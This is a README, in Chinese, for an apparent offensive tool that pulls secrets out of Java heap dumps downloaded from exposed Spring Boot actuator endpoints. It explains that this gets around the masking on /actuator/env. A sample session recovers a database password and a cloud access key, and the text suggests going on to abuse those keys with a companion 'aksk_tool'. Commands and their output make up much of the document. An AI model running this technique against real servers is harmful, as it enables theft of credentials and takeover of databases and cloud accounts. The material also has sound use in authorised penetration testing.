# heapdump_tool

```

该工具是基于jhat，通过jhat解析heapdump文件，所以需要安装jdk和配置好环境变量，例如win \Java\jdk8\bin\jhat.exe， 
在控制台输入jhat检查是否安装正确。

usage:> java -jar heapdump_tool.jar  heapdump
查询方式：
1. 关键词    例如 password, accesskey 
2. 字符长度   len=10    获取长度为10的所有key或者value值
3. 按顺序获取  num=1-100 获取顺序1-100的字符
获取url,file,ip
geturl
getfile
getip
如果不存在key-value形式，默认不输出查询结果，需要输入all=true获取所有值，all=false取消显示所有值。

----------------------------------------------------

常见的heapdump泄露，大多都是spring heapdump泄露

这里 以spring heapdump泄露 为例

访问 /env 或 /actuator/env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 ****** 号替换，以达到脱敏的效果。

这时候就可以利用 该 工具来获取 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码或AK(accessKey)等敏感信息。


访问 /actuator/env  得到部分信息如下

properties: {
spring.datasource.driver-class-name: {
value: "com.mysql.cj.jdbc.Driver",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:3:24"
},
spring.datasource.url: {
value: "jdbc:mysql://test.mysql.rds.aliyuncs.com:3306/test?useUnicode=true&characterEncoding=utf-8&useTimezone=true&serverTimezone=GMT%2B8",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:4:10"
},
spring.datasource.username: {
value: "root",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:5:15"
},
spring.datasource.password: {
value: "******",
origin: "URL [file:/home/test/deploy/config/application-pressure.yml]:6:15"
},


获取 spring.datasource.password ，页面返回内容为 *******

下载 heapdump 文件， 然后使用工具
root@wy:~# 
> java -jar heapdump_tool.jar  heapdump.6
[-] file: heapdump.6
[-] Start jhat, waiting...
[-] get objects,waiting(1-2min)...
[-] fing object count: 113128
[-] please input keyword value to search, example: accesskey,len=16,num=0-10,all=true input q/quit to quit.
> spring.datasource.password
[-] Start find keyword: spring.datasource.password
>> spring.datasource.password -> test@wyzxxz 
[-] please input keyword value to search, example: accesskey,len=16,num=0-10,all=true input q/quit to quit.
> accesskey
[-] Start find keyword: accessKey
>> ConnectionProperties.noAccessToProcedureBodies -> When determining procedure parameter types for CallableStatements, and the connected user can&#039;&#039;t access procedure bodies through &quot;SHOW CREATE PROCEDURE&quot; or select on mysql.proc should the driver instead create basic metadata
>> accessKey -> LTA**************
[-] please input keyword value to search, example: accesskey,len=16,num=0-10,all=true input q/quit to quit.
> q
[-] exit.


拿到ak sk后，可以结合 aksk_tool，进一步利用

```



